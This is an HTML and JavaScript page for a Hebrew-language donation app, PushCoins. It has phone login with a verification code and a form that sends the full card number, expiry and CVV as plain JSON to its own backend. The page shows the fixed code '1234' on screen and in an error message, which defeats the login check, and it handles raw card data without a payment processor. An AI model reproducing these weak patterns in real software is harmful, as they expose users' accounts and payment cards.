<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PushCoins</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #007aff; --success: #34c759; --bg: #f2f2f7; --card: #ffffff; --text: #1c1c1e; }
        body { font-family: 'Rubik', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 400px; background: var(--card); border-radius: 24px; padding: 30px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; }
        .logo-area { font-size: 50px; margin-bottom: 10px; }
        h1 { margin: 10px 0 5px; font-size: 28px; font-weight: 700; color: #333; }
        h2 { margin: 0 0 25px; font-size: 16px; font-weight: 400; color: #888; }
        input { width: 100%; padding: 16px; margin: 8px 0; border: 2px solid #eee; border-radius: 16px; font-size: 16px; text-align: center; box-sizing: border-box; outline: none; font-family: 'Rubik', sans-serif; }
        input:focus { border-color: var(--primary); background: #f9fcff; }
        button.main-btn { width: 100%; padding: 16px; background: var(--primary); color: white; border: none; border-radius: 16px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 15px rgba(0,122,255,0.3); transition: 0.2s; }
        button.main-btn:active { transform: scale(0.98); }
        .amount-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 10px; }
        .amount-btn { padding: 12px; background: #f0f0f0; border-radius: 12px; font-weight: 600; cursor: pointer; border: 2px solid transparent; }
        .amount-btn.selected { background: #eef7ff; color: var(--primary); border-color: var(--primary); }
        .cc-row { display: flex; gap: 10px; }
        .hidden { display: none; }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; pointer-events: none; transition: 0.3s; z-index: 1000; }
        .toast.show { opacity: 1; bottom: 40px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="login-screen">
            <div class="logo-area">🪙</div>
            <h1>ברוכים הבאים</h1>
            <h2>התחברות מאובטחת ל-PushCoins</h2>
            <input type="tel" id="phone" placeholder="מספר נייד (050-0000000)">
            <button class="main-btn" onclick="sendAuth()">שלח קוד אימות</button>
        </div>

        <div id="verify-screen" class="hidden">
            <div class="logo-area">🔐</div>
            <h1>אימות זהות</h1>
            <h2>הקוד נשלח אליך בהודעה (הקוד: 1234)</h2>
            <input type="tel" id="otp" placeholder="הכנס קוד (4 ספרות)" maxlength="4" style="letter-spacing: 5px; font-weight:bold;">
            <button class="main-btn" onclick="verifyAuth()">כניסה למערכת</button>
        </div>

        <div id="main-screen" class="hidden">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                <div style="text-align:right;">
                    <div style="font-size:14px; color:#888;">שלום, <span id="user-display-name">אורח</span></div>
                    <div style="font-size:24px; font-weight:bold;">₪<span id="total-donated">0</span> <span style="font-size:14px; font-weight:normal;">נתרמו</span></div>
                </div>
                <div style="font-size:30px;">👋</div>
            </div>

            <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">

            <div style="text-align:right; font-weight:600; margin-bottom:10px;">כמה תרצה לתרום?</div>
            <div class="amount-grid">
                <button class="amount-btn" onclick="selectAmount(18)">₪18</button>
                <button class="amount-btn" onclick="selectAmount(36)">₪36</button>
                <button class="amount-btn" onclick="selectAmount(100)">₪100</button>
            </div>
            <input type="number" id="custom-amount" placeholder="סכום אחר">

            <div style="text-align:right; font-weight:600; margin:15px 0 5px;">פרטים לקבלה:</div>
            <input type="text" id="fullName" placeholder="שם מלא (יופיע בקבלה)">
            <input type="email" id="email" placeholder="אימייל לקבלה">

            <div style="text-align:right; font-weight:600; margin:15px 0 5px;">אמצעי תשלום:</div>
            <input type="tel" id="cc-num" placeholder="מספר כרטיס אשראי" maxlength="16">
            <div class="cc-row">
                <input type="tel" id="cc-exp" placeholder="תוקף (0426)" maxlength="4">
                <input type="tel" id="cc-cvv" placeholder="CVV" maxlength="3">
            </div>

            <button class="main-btn" onclick="donate()" style="background: var(--success);">בצע תרומה ❤️</button>
        </div>

    </div>

    <div id="toast" class="toast">הודעה</div>

    <script>
        const API = 'https://pushcoins-server.onrender.com';
        let currentUser = null;

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.innerText = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3000);
        }

        async function sendAuth() {
            const phone = document.getElementById('phone').value.replace(/\D/g,''); // ניקוי מקפים
            if(phone.length < 9) return showToast('נא להזין מספר תקין');
            
            const btn = event.target;
            const originalText = btn.innerText;
            btn.innerHTML = 'שולח... <span class="loader"></span>';
            
            try {
                await fetch(`${API}/send-auth`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone }) });
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('verify-screen').classList.remove('hidden');
            } catch(e) { showToast('שגיאת תקשורת'); }
            
            btn.innerText = originalText;
        }

        async function verifyAuth() {
            const phone = document.getElementById('phone').value.replace(/\D/g,'');
            const code = document.getElementById('otp').value;
            const btn = event.target;
            btn.innerHTML = 'מאמת... <span class="loader"></span>';

            try {
                const res = await fetch(`${API}/verify-auth`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, code }) });
                const data = await res.json();
                if(data.success) {
                    currentUser = data.user;
                    loadMainScreen();
                } else { showToast('קוד שגוי, נסה 1234'); }
            } catch(e) { showToast('שגיאה בהתחברות'); }
            btn.innerText = 'כניסה למערכת';
        }

        function loadMainScreen() {
            document.getElementById('verify-screen').classList.add('hidden');
            document.getElementById('main-screen').classList.remove('hidden');
            if(currentUser.name) {
                document.getElementById('user-display-name').innerText = currentUser.name;
                document.getElementById('fullName').value = currentUser.name;
            }
            if(currentUser.email) document.getElementById('email').value = currentUser.email;
            document.getElementById('total-donated').innerText = currentUser.totalDonated;
        }

        function selectAmount(amount) {
            document.getElementById('custom-amount').value = amount;
            document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
            event.target.classList.add('selected');
        }

        async function donate() {
            const amount = document.getElementById('custom-amount').value;
            const fullName = document.getElementById('fullName').value;
            const email = document.getElementById('email').value;
            const ccNum = document.getElementById('cc-num').value;
            const ccExp = document.getElementById('cc-exp').value;
            const ccCvv = document.getElementById('cc-cvv').value;

            if(!amount || !fullName || !email || !ccNum || !ccExp || !ccCvv) return showToast('נא למלא את כל הפרטים');

            const btn = event.target;
            btn.innerHTML = 'מעבד תרומה... <span class="loader"></span>';

            try {
                const res = await fetch(`${API}/donate`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        phone: currentUser.phone,
                        amount: amount,
                        fullName: fullName, 
                        email: email,
                        ccDetails: { num: ccNum, exp: ccExp, cvv: ccCvv }
                    })
                });
                
                const data = await res.json();
                if(data.success) {
                    showToast('תודה! הקבלה נשלחה למייל 💖');
                    currentUser.totalDonated = data.newTotal;
                    document.getElementById('total-donated').innerText = data.newTotal;
                    document.getElementById('user-display-name').innerText = fullName;
                    document.getElementById('cc-num').value = '';
                    document.getElementById('cc-exp').value = '';
                    document.getElementById('cc-cvv').value = '';
                } else {
                    showToast('שגיאה: ' + (data.error || "נדחה"));
                }
            } catch(e) { showToast('שגיאה בתקשורת'); }
            
            btn.innerText = 'בצע תרומה ❤️';
        }
    </script>
</body>
</html>
